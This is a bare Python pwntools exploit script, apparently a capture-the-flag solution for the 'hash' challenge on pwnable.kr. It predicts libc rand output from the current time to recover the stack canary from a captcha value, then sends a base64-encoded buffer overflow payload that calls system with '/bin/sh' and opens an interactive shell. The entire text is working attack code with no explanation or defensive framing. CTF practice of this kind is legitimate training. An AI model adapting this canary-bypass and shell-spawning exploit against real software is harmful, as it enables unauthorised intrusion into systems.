from pwn import *
from ctypes import *
from ctypes.util import find_library
import base64

libc=CDLL(find_library('c'))
libc.srand(libc.time(0))
r=remote("pwnable.kr",9002)
#r=process("./hash")
b=ELF("./hash")

binsh=0x804b0e0+720

r.recvuntil("captcha : ")
cap=int(r.recvline().strip())

rnd=[]
for i in range(8):
	rnd.append(libc.rand())

canary=cap-(rnd[1]+rnd[2]-rnd[3]+rnd[4]+rnd[5]-rnd[6]+rnd[7])&0xffffffff

#log.info(hex(canary))

pay=''
pay+='x'*0x200
pay+=p32(canary)
pay+='x'*12
pay+=p32(b.plt['system'])
pay+='x'*4
pay+=p32(binsh)
pay=base64.b64encode(pay)

#print len(pay)
pay+='/bin/sh\x00'
r.sendline(str(cap))
r.sendline(pay)
r.interactive()
